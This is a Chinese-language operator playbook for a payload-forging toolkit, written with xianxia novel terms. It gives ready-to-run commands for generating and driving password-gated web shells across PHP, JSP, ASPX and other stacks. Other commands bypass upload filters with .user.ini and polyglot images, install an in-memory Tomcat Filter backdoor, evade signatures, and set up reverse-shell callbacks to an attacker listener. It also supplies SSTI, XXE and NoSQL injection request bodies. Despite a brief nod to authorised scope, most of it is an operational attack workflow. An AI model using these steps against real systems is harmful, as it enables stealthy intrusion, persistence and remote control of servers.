# 大爱仙尊载荷锻造手法

> 工具：`python3 炼蛊房/payload_forge.py`  
> 监听：`python3 炼蛊房/se_listen.py`  
> 特征：`sig_cleanup_scan.py`  
> 验活：`host_c2_verify.py`  
> 上传变体：`upload_forge_probe.py kit`

目标须在 scope。Web 马一律 `X-SE` 口令，无口令 404。二进制不进 git。清日志仍先问。

---

## 1. 立刻跑

```bash
python3 炼蛊房/payload_forge.py --self-test
python3 炼蛊房/se_listen.py --self-test
python3 炼蛊房/payload_forge.py --list
python3 炼蛊房/payload_forge.py campaign --case <案> --lhost <攻击机> --lport 4444
python3 炼蛊房/payload_forge.py drive --url https://授权站/se_ops.php --key <口令> --a c --c id
python3 炼蛊房/se_listen.py --lhost 0.0.0.0 --lport 4444 --case <案>
```

`kit` 只要 web+回连。`campaign` 再打包 gadgets + 上传变体 + `CAMPAIGN.md`。  
产物：`案卷/payloads/`（`HOW_TO.md` + `manifest.json`）。

---

## 2. 四刀

1. **出马** — `campaign` 一次出齐；单刀用 `php-ops`（`i/c/j/l/r/w/p` + `c64`）  
2. **过闸** — 锻造已扫特征；dirty 先清再传。拦扩展走 `upload/` 或 `php-img`  
3. **落地** — `drive --a i` 有 uname，`--a c --c id` 有 `uid=` 才算 L3  
4. **回连** — 攻击机 `se_listen.py`（案卷 `案卷/c2/listen.jsonl`），授权机跑 `se_cb.*`

Tomcat 8/9：`se_mem.jsp?install=1` 挂内存 Filter，之后任意路径带 `X-SE` + `X-SE-CMD`，JSP 可删。  
`gadgets` 写出 Jinja/Twig SSTI、XXE、NoSQL `$ne` 请求体，配合对应作业手法打。

---

## 3. kind

| kind | 文件 | 用途 |
|------|------|------|
| php-ops | se_ops.php | `a=i/c/j/l/r/w/p`，命令可用 `c64` |
| php-ini | .user.ini | `auto_prepend_file=se_ops.php` |
| php-cmd / php-tiny | se_gate.php | 只执行命令 |
| php-img | se_poly.jpg | 图床 / 双扩展 |
| jsp-cmd | se_gate.jsp | Tomcat 文件马 |
| jsp-filter | se_mem.jsp | Tomcat 8/9 内存 Filter |
| aspx / asp / cfm | se_gate.* | 对应栈 |
| py-cmd / js-cmd | se_gate.py/.js | 授权机监听口 |
| war-jsp | se_gate.war | 含 `se_gate.jsp` + `se_mem.jsp` |
| php-rev / rev-* | se_cb.* | 回连 |
| gad-* | se_ssti_*.txt / se_xxe.xml / se_nosql.json | 请求体 |
